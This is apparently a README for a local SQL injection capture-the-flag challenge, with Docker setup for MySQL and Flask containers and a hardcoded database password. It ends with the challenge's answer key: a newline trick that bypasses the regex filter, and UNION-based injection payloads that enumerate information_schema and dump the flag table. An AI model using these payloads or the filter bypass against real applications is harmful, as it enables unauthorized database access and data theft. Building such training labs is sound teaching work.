## Build the image

go to the mysql directory and run:

```docker build -t sql_injection_challenge_mysql .```

go to the flask directory and run:

```docker build -t sql_injection_challenge_flask .```

## run the containers:

create the docker network connecting both containers:

```docker network create sql_injection```

first, run the mysql container:

```docker run --rm -it -e MYSQL_ROOT_PASSWORD=shoshohN3Eishah8aegae4phiomoot7u -e MYSQL_DATABASE=flask -p 127.0.0.1:3306:3306 --network sql_injection --name sql_injection_challenge_mysql sql_injection_challenge_mysql```

second, run the flask container:

```docker run --rm -it -p 127.0.0.1:8080:8080 --network sql_injection --name sql_injection_challenge_flask sql_injection_challenge_flask```

TODO: use docker-compose instead of two single docker containers (with the flask container depending on the mysql container to be run first, running in the same docker network, so they can find each other with their names).

## exploit sqli

visit http://127.0.0.1:8080 in your browser and try to exploit the sqli with the "search functionality". If you use a brower, check the sites source after the response is received.

to "troll" the CTF players, there is a detection of possible injection attempts with a regex, which e.g. detects a "\'" and gives the players to a random choice of 10 "troll" sites (see the "static" folder).

one possibility to get the flag (as of now, you have to break the regex by using a "\n"):

possible injection to display all products:

 ```\n%' or 'a'='a'; #```

how to get database names:

```\n%' or 'a'='a' union select group_concat(schema_name) from information_schema.schemata; #```

how to get table names:

```\n%' or 'a'='a' union select group_concat(table_name) from information_schema.tables where table_schema='flask'; #```

get column names of table 'flag':

```\n%' or 'a'='a' union select group_concat(column_name) from information_schema.columns where table_name='flag'; #```

get flag itself:

```\n%' or 'a'='a' union select group_concat(flag) from flask.flag; #```